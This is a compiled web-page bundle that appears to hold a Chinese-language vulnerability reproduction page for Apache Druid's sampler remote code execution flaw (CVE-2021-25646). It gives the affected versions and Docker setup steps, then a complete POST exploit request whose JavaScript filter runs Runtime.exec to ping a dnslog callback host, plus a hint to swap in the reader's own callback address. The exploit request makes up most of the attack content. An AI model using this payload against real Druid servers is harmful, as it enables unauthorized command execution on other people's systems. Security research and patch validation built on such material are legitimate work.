(window.webpackJsonp=window.webpackJsonp||[]).push([[552],{2639:function(t,s,a){t.exports=a.p+"assets/img/2ff63956-f284-448b-aa1f-ad388b2c1be2.29ffabdc.png"},2640:function(t,s,a){t.exports=a.p+"assets/img/76ab3573-05f8-4abe-b4ea-cd4d400689ee.5cc3cf34.png"},3399:function(t,s,a){"use strict";a.r(s);var n=a(64),e=Object(n.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"apache-druid-sampler-远程代码执行漏洞-cve-2021-25646"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#apache-druid-sampler-远程代码执行漏洞-cve-2021-25646"}},[t._v("#")]),t._v(" Apache Druid sampler 远程代码执行漏洞 CVE-2021-25646")]),t._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),s("p",[t._v("Apache Druid 是用Java编写的面向列的开源分布式数据存储，旨在快速获取大量事件数据，并在数据之上提供低延迟查询。\nApache Druid 默认情况下缺乏授权认证，攻击者可以发送特制请求，利用Druid服务器上进程的特权执行任意代码。\nApache Druid包括执行用户提供的JavaScript的功能嵌入在各种类型请求中的代码。此功能在用于高信任度环境中，默认已被禁用。但是，在Druid 0.20.0及更低版本中，经过身份验证的用户发送恶意请求，利用Apache Druid漏洞可以执行任意代码")]),t._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v("Apache Druid < 0.20.1")]),s("br"),t._v(" "),s("h2",{attrs:{id:"环境搭建"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[t._v("#")]),t._v(" 环境搭建")]),t._v(" "),s("p",[t._v("这里使用Docker来搭建环境")]),t._v(" "),s("a-alert",{attrs:{type:"success",message:"Docker下载链接: https://github.com/apache/druid/archive/druid-0.20.0.zip",description:"",showIcon:""}}),t._v(" "),s("br"),t._v(" "),s("p",[t._v("下载之后进入目录 "),s("code",[t._v("distribution\\docker")])]),t._v(" "),s("p",[t._v("执行命令编译 "),s("code",[t._v("docker-compose up -d")])]),t._v(" "),s("p",[s("img",{attrs:{src:a(2639),alt:"2ff63956-f284-448b-aa1f-ad388b2c1be2"}})]),t._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),s("p",[t._v("验证POC")]),t._v(" "),s("div",{staticClass:"language-shell line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-shell"}},[s("code",[t._v("POST /druid/indexer/v1/sampler\nContent-Type: application/json\n\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"type"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"index"')]),t._v(", "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"spec"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"ioConfig"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"type"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"index"')]),t._v(", "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"inputSource"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"type"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"inline"')]),t._v(", "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"data"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"{'),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("isRobot"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":true,"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("channel"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("#x"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(","),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("timestamp"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("2021-2-1T14:12:24.050Z"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(","),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("flags"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("x"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(","),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("isUnpatrolled"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":false,"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("page"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("1"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(","),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("diffUrl"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("https://xxx.com"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(","),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("added"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":1,"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("comment"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("Botskapande Indonesien omdirigering"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(","),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("commentLength"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":35,"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("isNew"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":true,"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("isMinor"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":false,"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("delta"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":31,"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("isAnonymous"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":true,"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("user"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("Lsjbot"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(","),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("deltaBucket"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":0,"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("deleted"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":0,"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("namespace"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("Main"),s("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v('}"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v(", "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"inputFormat"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"type"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"json"')]),t._v(", "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"keepNullColumns"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" true"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v(", "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"dataSchema"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"dataSource"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"sample"')]),t._v(", "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"timestampSpec"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"column"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"timestamp"')]),t._v(", "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"format"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"iso"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v(", "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"dimensionsSpec"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v(", "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"transformSpec"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"transforms"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(", "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"filter"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"type"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"javascript"')]),t._v(", "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"dimension"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"added"')]),t._v(", "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"function"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("\"function(value) {java.lang.Runtime.getRuntime().exec('ping p3fpw5.dnslog.cn')}\"")]),t._v(", "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('""')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"enabled"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" true"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v(", "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"type"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"index"')]),t._v(", "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"tuningConfig"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"type"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"index"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v(", "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"samplerConfig"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"numRows"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("500")]),t._v(", "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"timeoutMs"')]),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("15000")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br")])]),s("p",[s("img",{attrs:{src:a(2640),alt:"76ab3573-05f8-4abe-b4ea-cd4d400689ee"}})]),t._v(" "),s("br"),t._v(" "),s("a-alert",{attrs:{type:"success",message:"注意请求中这个位置改为你的dnslog平台地址",description:"",showIcon:""}}),t._v(" "),s("br"),t._v(" "),s("a-alert",{attrs:{type:"success",message:"java.lang.Runtime.getRuntime().exec('ping -c 4 xxxxx.dnslog.cn')",description:"",showIcon:""}}),t._v(" "),s("br")],1)}),[],!1,null,null,null);s.default=e.exports}}]);